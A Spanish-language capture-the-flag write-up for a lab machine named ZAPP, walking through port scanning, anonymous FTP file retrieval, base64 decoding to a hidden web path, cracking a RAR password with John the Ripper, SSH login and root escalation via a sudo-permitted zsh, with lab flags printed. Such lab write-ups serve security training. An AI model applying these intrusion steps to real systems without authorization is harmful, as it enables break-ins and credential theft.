
# 🛡️ CTF ZAPP - Writeup

## 🚀 Inicio
```bash
ctf-init ZAPP
```
```
[+] Entorno CTF creado en /home/predator/Escritorio/ZAPP
 exploit   files   notes   post   recon
```

---

## 🔍 Reconocimiento
### Puertos abiertos
```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

### FTP - Anónimo permitido
```bash
ftp-anon: Anonymous FTP login allowed (FTP code 230)
-rw-r--r--    1 0        0              28 Oct 29  2025 login.txt
-rw-r--r--    1 0        0              65 Oct 29  2025 secret.txt
```

### Descarga de archivos
```bash
ftp> user anonymous
Password: 12345
ftp> get login.txt
ftp> get secret.txt
ftp> exit
```

---

## 🌐 Web - Decodificación Base64 (4 veces)
Resultado: `cuatrocuatroveces`

Ruta encontrada:
```
http://IP/cuatrocuatroveces/
```
<img width="1920" height="926" alt="codigoweb" src="https://github.com/user-attachments/assets/ec79e788-9d17-405b-9777-96e418a73057" />

Se descarga un archivo `.rar`
<img width="1920" height="934" alt="rar" src="https://github.com/user-attachments/assets/d458741b-149f-4222-a05e-a3a857c652a0" />

---

## 🔓 Crackeo del RAR
```bash
rar2john Sup3rP4ss.rar > rar.hash
john --wordlist=/usr/share/wordlists/rockyou.txt rar.hash
7z x Sup3rP4ss.rar
```

**Contenido:**  
`Intenta probar con más >> 3spuM4`

---

## 🐚 Acceso SSH
```bash
ssh zappskred@<IP>
```
```
zappskred@TheHackersLabs-ZAPP:~$ ls
user.txt
zappskred@TheHackersLabs-ZAPP:~$ cat user.txt
ZWwgbWVqb3IgY2FmZQo=
```

---

## 🔑 Escalada de privilegios
```bash
zappskred@TheHackersLabs-ZAPP:~$ sudo -l
User zappskred may run the following commands on TheHackersLabs-ZAPP:
    (root) /bin/zsh

zappskred@TheHackersLabs-ZAPP:~$ sudo /bin/zsh
```

---

## 🏁 Root
```bash
TheHackersLabs-ZAPP# whoami
root
TheHackersLabs-ZAPP# cd /root
TheHackersLabs-ZAPP# cat root.txt
```

> **¡Hackeamos la máquina! 🎉**
```

Guarda esto como `ZAPP.md` en tu carpeta `notes` y tendrás el writeup completo y formateado. ✅
